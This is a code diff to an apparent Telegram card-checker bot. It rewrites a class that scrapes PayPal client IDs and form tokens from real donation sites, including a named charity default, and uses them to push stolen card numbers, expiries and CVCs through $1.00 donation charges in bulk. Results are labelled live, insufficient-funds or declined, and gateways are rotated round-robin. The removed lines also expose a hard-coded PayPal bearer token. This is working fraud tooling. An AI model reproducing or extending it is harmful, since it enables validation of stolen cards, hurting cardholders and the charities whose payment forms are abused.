@@ -29,7 +29,6 @@ ANTI_SPAM_SECONDS = 7
 user_tasks = {}
 CODES = {}
 
-# Round Robin Counter
 gateway_index = 0
 
 # ------------------- Premium Emoji Configuration -------------------
@@ -80,152 +79,503 @@ async def get_bin_info(bin_number):
     urls = [
         f"https://bins.antipublic.cc/bins/{bin_number}",
         f"https://lookup.binlist.net/{bin_number}",
-        f"https://bincheck.io/api/{bin_number}"
     ]
-    for attempt in range(3):
-        for url in urls:
-            try:
-                async with httpx.AsyncClient(timeout=10) as client:
-                    r = await client.get(url)
-                if r.status_code != 200:
-                    continue
-                data = r.json()
-                brand = data.get("scheme") or data.get("brand") or data.get("type")
-                card_type = data.get("type") or data.get("card_type")
-                bank = data.get("bank", {}).get("name") if isinstance(data.get("bank"), dict) else data.get("bank")
-                country = data.get("country", {}).get("name") if isinstance(data.get("country"), dict) else data.get("country")
-                if not bank:
-                    bank = data.get("issuer") or data.get("bank_name")
-                if not country:
-                    country = data.get("country_name")
-                if brand or bank or country:
-                    return (f"{brand or 'Unknown'} - {card_type or 'Unknown'}", bank or "Unknown", country or "Unknown")
-            except:
+    for url in urls:
+        try:
+            async with httpx.AsyncClient(timeout=10) as client:
+                r = await client.get(url)
+            if r.status_code != 200:
                 continue
-            await asyncio.sleep(0.5)
+            data = r.json()
+            brand = data.get("scheme") or data.get("brand") or data.get("type")
+            card_type = data.get("type") or data.get("card_type")
+            bank = data.get("bank", {}).get("name") if isinstance(data.get("bank"), dict) else data.get("bank")
+            country = data.get("country", {}).get("name") if isinstance(data.get("country"), dict) else data.get("country")
+            if not bank:
+                bank = data.get("issuer") or data.get("bank_name")
+            if not country:
+                country = data.get("country_name")
+            if brand or bank or country:
+                return (f"{brand or 'Unknown'} - {card_type or 'Unknown'}", bank or "Unknown", country or "Unknown")
+        except:
+            continue
+        await asyncio.sleep(0.5)
     return "Unknown", "Unknown", "Unknown"
 
-# ------------------- PayPal Class -------------------
+# ------------------- PayPal Commerce Class - Final -------------------
 
-class PayPal:
+class PayPalCommerce:
     def __init__(self, target_url=None):
-        self.first_name = ["James", "John", "Robert", "Michael", "William"]
-        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
-        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
+        self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
+        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
         self.donation = "1.00"
-        self.id_form1 = "15-1"
-        self.id_form2 = "15"
-        self.nonec = "06535837f9"
-        self.au = "A21AAOA1lMckXJBEqxZt3c1uNJWrHvPPee9Owp1to72_ya9sLYYG448eI7Kyouk1B8CPTEYia2OMrLch_ZthqrPHm0h5-jLng"
-        
-        url = target_url if target_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/'
-        parsed = urlparse(url)
-        self.url = parsed.netloc
-        self.inurl = parsed.path
-        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
         self.r = requests.Session()
         self.uu = UserAgent()
         self.checked = 0
+        
+        self.client_id = None
+        self.access_token = None
+        self.client_token = None
+        self.form_data = {}
+        self.ajax_url = None
+        self.payment_method = None
+        
+        self.target_url = target_url if target_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/'
+        self.url = urlparse(self.target_url).netloc
+        self.inurl = urlparse(self.target_url).path
+        if urlparse(self.target_url).query:
+            self.inurl += f"?{urlparse(self.target_url).query}"
+        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
+        
+        self._init_and_extract()
+        self._get_access_token()
+        self._get_client_token()
 
-    def Key(self):
-        return self.au, self.id_form1, self.id_form2, self.nonec
+    def _init_and_extract(self):
+        """تهيئة واستخراج كل البيانات"""
+        try:
+            headers = {
+                'user-agent': self.uu.random,
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'accept-language': 'en-US,en;q=0.9',
+            }
+            
+            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
+            html = response.text
+            
+            self._extract_client_id(html)
+            self._extract_form_data(html)
+            self._detect_gateway_type(html)
+            self._extract_ajax_url(html)
+            
+        except:
+            pass
+
+    def _extract_client_id(self, html):
+        """استخراج client_id - كل الطرق"""
+        patterns = [
+            r'client-id="([^"]+)"',
+            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)',
+            r'data-client-id="([^"]+)"',
+            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})',
+            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)',
+            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)',
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, html, re.IGNORECASE)
+            if match:
+                self.client_id = match.group(1)
+                return
+        
+        script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
+        for script in script_matches:
+            for pattern in patterns:
+                match = re.search(pattern, script, re.IGNORECASE)
+                if match:
+                    self.client_id = match.group(1)
+                    return
+        
+        long_strings = re.findall(r'["\']([A-Za-z0-9_-]{80,})["\']', html)
+        for string in long_strings:
+            if string.startswith(('A', 'B', 'E')):
+                self.client_id = string
+                return
+        
+        src_matches = re.findall(r'<script[^>]*src="([^"]+)"[^>]*>', html)
+        for src in src_matches:
+            if 'paypal' in src.lower():
+                client_id_match = re.search(r'client-id=([^&"\']+)', src)
+                if client_id_match:
+                    self.client_id = client_id_match.group(1)
+                    return
+
+    def _extract_form_data(self, html):
+        """استخراج hidden inputs"""
+        inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
+        for name, value in inputs:
+            self.form_data[name] = value
+        
+        data_attrs = re.findall(r'data-([\w-]+)="([^"]+)"', html)
+        for attr_name, attr_value in data_attrs:
+            if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'client', 'merchant', 'nonce', 'hash']):
+                self.form_data[attr_name] = attr_value
+
+    def _detect_gateway_type(self, html):
+        """تحديد نوع البوابة"""
+        html_lower = html.lower()
+        if 'give-form' in html or 'give_paypal_commerce' in html or 'givewp' in html_lower:
+            self.payment_method = "givewp"
+        elif 'woocommerce' in html_lower or 'wc-ajax' in html_lower:
+            self.payment_method = "woocommerce"
+        elif 'paypal' in html_lower:
+            self.payment_method = "generic"
+        else:
+            self.payment_method = "unknown"
+
+    def _extract_ajax_url(self, html):
+        """استخراج AJAX URL"""
+        if 'admin-ajax.php' in html:
+            self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
+        elif 'wc-ajax' in html:
+            self.ajax_url = f'https://{self.url}/?wc-ajax=checkout'
+
+    def _get_access_token(self):
+        """جلب access token"""
+        if not self.client_id:
+            return None
+        
+        try:
+            headers = {
+                'user-agent': self.uu.random,
+                'accept': 'application/json',
+                'content-type': 'application/x-www-form-urlencoded',
+            }
+            
+            data = {'grant_type': 'client_credentials'}
+            
+            response = self.r.post(
+                'https://api-m.paypal.com/v1/oauth2/token',
+                headers=headers,
+                data=data,
+                auth=(self.client_id, ''),
+                timeout=15
+            )
+            
+            if response.status_code == 200:
+                self.access_token = response.json().get('access_token')
+                return self.access_token
+            
+        except:
+            pass
+        
+        return None
+
+    def _get_client_token(self):
+        """جلب client_token من الموقع"""
+        if not self.ajax_url:
+            return None
+        
+        try:
+            actions = [
+                'give_paypal_commerce_get_client_token',
+                'get_client_token',
+                'paypal_get_client_token',
+            ]
+            
+            for action in actions:
+                data = {
+                    'action': action,
+                    'form-id': self.form_data.get('give-form-id', ''),
+                }
+                
+                headers = {
+                    'user-agent': self.uu.random,
+                    'x-requested-with': 'XMLHttpRequest',
+                    'origin': f'https://{self.url}',
+                    'referer': f'https://{self.url}{self.inurl}',
+                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                }
+                
+                response = self.r.post(self.ajax_url, data=data, headers=headers, timeout=10)
+                
+                if response.status_code == 200 and response.text:
+                    json_data = response.json()
+                    if 'data' in json_data:
+                        if isinstance(json_data['data'], dict):
+                            self.client_token = json_data['data'].get('client_token') or json_data['data'].get('token')
+                        elif isinstance(json_data['data'], str):
+                            self.client_token = json_data['data']
+                        
+                        if self.client_token:
+                            return self.client_token
+            
+            return None
+        except:
+            return None
+
+    def _create_order(self):
+        """إنشاء Order - Universal"""
+        if self.ajax_url:
+            order_id = self._create_order_givewp()
+            if order_id:
+                return order_id
+        
+        if self.access_token:
+            order_id = self._create_order_direct()
+            if order_id:
+                return order_id
+        
+        return None
+
+    def _create_order_givewp(self):
+        """إنشاء Order من الموقع"""
+        if not self.ajax_url:
+            return None
+        
+        form_data = self.form_data.copy()
+        form_data.update({
+            'give-amount': self.donation,
+            'payment-mode': 'paypal-commerce',
+            'give_first': random.choice(self.first_name),
+            'give_last': random.choice(self.last_name),
+            'give_email': self.email,
+            'give-gateway': 'paypal-commerce',
+        })
+        
+        headers = {
+            'user-agent': self.uu.random,
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'x-requested-with': 'XMLHttpRequest',
+            'origin': f'https://{self.url}',
+            'referer': f'https://{self.url}{self.inurl}',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        }
+        
+        actions = [
+            'give_paypal_commerce_create_order',
+            'give_create_order',
+            'create_order',
+        ]
+        
+        for action in actions:
+            params = {'action': action}
+            
+            try:
+                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, timeout=15)
+                
+                if response.status_code == 200 and response.text:
+                    json_data = response.json()
+                    
+                    if 'data' in json_data:
+                        if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
+                            return json_data['data']['id']
+                        elif isinstance(json_data['data'], str):
+                            return json_data['data']
+                    
+                    if 'id' in json_data:
+                        return json_data['id']
+                    
+                    if 'order_id' in json_data:
+                        return json_data['order_id']
+                    
+                    if 'orderID' in json_data:
+                        return json_data['orderID']
+            
+            except:
+                continue
+        
+        return None
+
+    def _create_order_direct(self):
+        """إنشاء Order مباشرة"""
+        if not self.access_token:
+            return None
+        
+        try:
+            headers = {
+                'authorization': f'Bearer {self.access_token}',
+                'content-type': 'application/json',
+                'user-agent': self.uu.random,
+                'accept': 'application/json',
+            }
+            
+            data = {
+                'intent': 'CAPTURE',
+                'purchase_units': [{
+                    'amount': {
+                        'currency_code': 'USD',
+                        'value': self.donation
+                    }
+                }],
+                'application_context': {
+                    'shipping_preference': 'NO_SHIPPING',
+                    'user_action': 'PAY_NOW',
+                }
+            }
+            
+            response = self.r.post(
+                'https://api-m.paypal.com/v2/checkout/orders',
+                headers=headers,
+                json=data,
+                timeout=15
+            )
+            
+            if response.status_code in [200, 201]:
+                response_data = response.json()
+                if 'id' in response_data:
+                    return response_data['id']
+            
+            return None
+        except:
+            return None
+
+    def _approve_order(self, order_id):
+        """الموقع يرجع الرد"""
+        if not self.ajax_url:
+            return None
+        
+        form_data = self.form_data.copy()
+        form_data.update({
+            'give-amount': self.donation,
+            'payment-mode': 'paypal-commerce',
+            'give_first': random.choice(self.first_name),
+            'give_last': random.choice(self.last_name),
+            'give_email': self.email,
+            'give-gateway': 'paypal-commerce',
+        })
+        
+        headers = {
+            'user-agent': self.uu.random,
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'x-requested-with': 'XMLHttpRequest',
+            'origin': f'https://{self.url}',
+            'referer': f'https://{self.url}{self.inurl}',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        }
+        
+        actions = [
+            'give_paypal_commerce_approve_order',
+            'give_approve_order',
+            'approve_order',
+        ]
+        
+        for action in actions:
+            params = {
+                'action': action,
+                'order': order_id,
+            }
+            
+            try:
+                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, timeout=15)
+                
+                if response.status_code == 200:
+                    return response
+            except:
+                continue
+        
+        return None
 
     def Charge(self, ccx):
+        """فحص البطاقة - التصنيف النهائي"""
         self.checked += 1
         ccx = ccx.strip()
-        n = ccx.split("|")[0]
-        mm = ccx.split("|")[1]
-        yy = ccx.split("|")[2]
-        cvc = ccx.split("|")[3].strip()
-        if "20" in yy:
-            yy = yy.split("20")[1]
-        
-        da2 = MultipartEncoder({
-            'give-form-id-prefix': (None, self.id_form1),
-            'give-form-id': (None, self.id_form2),
-            'give-form-hash': (None, self.nonec),
-            'give-amount': (None, self.donation),
-            'payment-mode': (None, 'paypal-commerce'),
-            'give_first': (None, random.choice(self.first_name)),
-            'give_last': (None, random.choice(self.last_name)),
-            'give_email': (None, self.email),
-            'give-gateway': (None, 'paypal-commerce'),
-        })
-        he3 = {'content-type': da2.content_type, 'user-agent': self.uu.random}
-        pa1 = {'action': 'give_paypal_commerce_create_order'}
         
         try:
-            r3 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']
-        except Exception as e:
-            return f"Create Order Failed: {e}"
-
-        he4 = {
-            'authorization': f'Bearer {self.au}',
-            'paypal-client-metadata-id': self.paypal,
-            'user-agent': self.uu.random,
-        }
-        da3 = {
-            'payment_source': {
-                'card': {
-                    'number': n, 'expiry': f'20{yy}-{mm}', 'security_code': cvc,
-                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
-                },
-            },
-            'application_context': {'vault': False},
-        }
-        
-        confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{r3}/confirm-payment-source', headers=he4, json=da3)
-        try:
-            confirm_json = confirm_res.json()
-        except:
-            confirm_json = {}
-
-        da4 = MultipartEncoder({
-            'give-form-id-prefix': (None, self.id_form1),
-            'give-form-id': (None, self.id_form2),
-            'give-form-hash': (None, self.nonec),
-            'give-amount': (None, self.donation),
-            'payment-mode': (None, 'paypal-commerce'),
-            'give_first': (None, random.choice(self.first_name)),
-            'give_last': (None, random.choice(self.last_name)),
-            'give_email': (None, self.email),
-            'give-gateway': (None, 'paypal-commerce'),
-        })
-        he5 = {'content-type': da4.content_type, 'user-agent': self.uu.random}
-        pa2 = {'action': 'give_paypal_commerce_approve_order', 'order': r3}
-        r5 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
-        
-        text = r5.text
-        if 'true' in text: 
-            return 'CHARGE 1.00$'
-        elif 'INSUFFICIENT_FUNDS' in text or 'INSUFFICIENT_FUNDS' in str(confirm_json): 
-            return "INSUFFICIENT_FUNDS"
-        else:
-            if isinstance(confirm_json, dict) and 'details' in confirm_json and len(confirm_json['details']) > 0:
-                issue = confirm_json['details'][0].get('issue', '')
-                description = confirm_json['details'][0].get('description', '')
-                if issue:
-                    return f"{issue}: {description}" if description else issue
+            parts = ccx.split("|")
+            if len(parts) < 4:
+                return "Invalid card format"
             
-            if isinstance(confirm_json, dict) and 'name' in confirm_json:
-                msg = confirm_json.get('message', '')
-                return f"{confirm_json.get('name')}: {msg}" if msg else confirm_json.get('name')
-
-            try: 
-                return r5.json()['data']['error']
-            except: 
+            n = parts[0].strip()
+            mm = parts[1].strip()
+            yy = parts[2].strip()
+            cvc = parts[3].strip()
+            
+            if "20" in yy:
+                yy = yy.split("20")[1]
+            
+            expiry = f"20{yy}-{mm}"
+            
+            # 1. Order
+            order_id = self._create_order()
+            if not order_id:
+                return "Create Order Failed"
+            
+            # 2. Confirm
+            auth_tokens = []
+            if self.client_token:
+                auth_tokens.append(self.client_token)
+            if self.access_token:
+                auth_tokens.append(self.access_token)
+            if self.client_id:
+                auth_tokens.append(self.client_id)
+            
+            confirm_res = None
+            confirm_json = {}
+            
+            for auth_token in auth_tokens:
+                he4 = {
+                    'authorization': f'Bearer {auth_token}',
+                    'paypal-client-metadata-id': self.client_id or '',
+                    'user-agent': self.uu.random,
+                }
+                
+                da3 = {
+                    'payment_source': {
+                        'card': {
+                            'number': n,
+                            'expiry': expiry,
+                            'security_code': cvc,
+                            'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
+                        },
+                    },
+                    'application_context': {'vault': False},
+                }
+                
+                try:
+                    confirm_res = self.r.post(
+                        f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
+                        headers=he4,
+                        json=da3,
+                        timeout=15
+                    )
+                    
+                    if confirm_res.status_code == 200:
+                        try:
+                            confirm_json = confirm_res.json()
+                        except:
+                            confirm_json = {}
+                        break
+                    
+                except:
+                    continue
+            
+            # 3. Approve - الموقع يرجع الرد
+            approve_res = self._approve_order(order_id)
+            
+            text = approve_res.text if approve_res else ''
+            
+            # التصنيف النهائي
+            if 'true' in text:
+                return 'CHARGE 1.0'
+            elif 'INSUFFICIENT_FUNDS' in text or 'INSUFFICIENT_FUNDS' in str(confirm_json):
+                return "INSUFFICIENT_FUNDS"
+            elif 'ORDER_NOT_APPROVED' in str(confirm_json) or 'ORDER_NOT_APPROVED' in text:
+                # خطأ - نرجع الرسالة المطلوبة
+                return "Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction."
+            else:
+                # نجيب الـ error
+                if isinstance(confirm_json, dict) and 'details' in confirm_json and len(confirm_json['details']) > 0:
+                    issue = confirm_json['details'][0].get('issue', '')
+                    description = confirm_json['details'][0].get('description', '')
+                    if issue and issue != 'ORDER_NOT_APPROVED':
+                        return f"{issue}: {description}" if description else issue
+                
+                if isinstance(confirm_json, dict) and 'name' in confirm_json:
+                    msg = confirm_json.get('message', '')
+                    return f"{confirm_json.get('name')}: {msg}" if msg else confirm_json.get('name')
+                
+                if approve_res:
+                    try:
+                        return approve_res.json()['data']['error']
+                    except:
+                        pass
+                
                 return "DECLINED"
+        
+        except Exception as e:
+            return f"Error: {e}"
 
-# ------------------- Core API Engine (Round Robin) -------------------
+# ------------------- Core API Engine -------------------
 
 async def check_card_api(card_full, gateway_url):
-    """Check card on specific gateway"""
+    """فحص البطاقة"""
     async with api_semaphore:
         try:
             loop = asyncio.get_event_loop()
             
             def run_check():
-                pp_engine = PayPal(target_url=gateway_url if gateway_url else None)
+                pp_engine = PayPalCommerce(target_url=gateway_url if gateway_url else None)
                 return pp_engine.Charge(card_full)
 
             result_raw = await loop.run_in_executor(None, run_check)
@@ -260,7 +610,6 @@ async def format_response(card_full, status, response, taken, gateway_url, gatew
     else:
         user_status = "𝐅𝐫𝐞𝐞 𝐔𝐬𝐞𝐫 🤖"
 
-    # Gateway info - only for admins
     gateway_info = ""
     if user_id in ADMINS and gateway_url:
         gateway_info = f"\n[🔗] 𝐆𝐚𝐭𝐞 #{gateway_num}: <code>{gateway_url}</code>"
@@ -360,7 +709,6 @@ async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(premium_emoji(text), parse_mode="HTML")
         return
     
-    # Round Robin: select gateway
     gateway_num = 0
     gateway_url = None
     if GATEWAYS:
@@ -405,7 +753,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"Error: {e}")
 
-# ------------------- The Mass Panel Processing Loop (Round Robin) -------------------
+# ------------------- The Mass Panel Processing Loop -------------------
 
 async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global gateway_index
@@ -435,7 +783,6 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             card_full = match[0]
             card_counter += 1
             
-            # Round Robin: select gateway for each card
             gateway_num = 0
             gateway_url = None
             if GATEWAYS:
@@ -460,7 +807,6 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 
             last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
             
-            # Gateway info - only for admins
             gate_info = ""
             if user_id in ADMINS:
                 if total_gateways > 0:
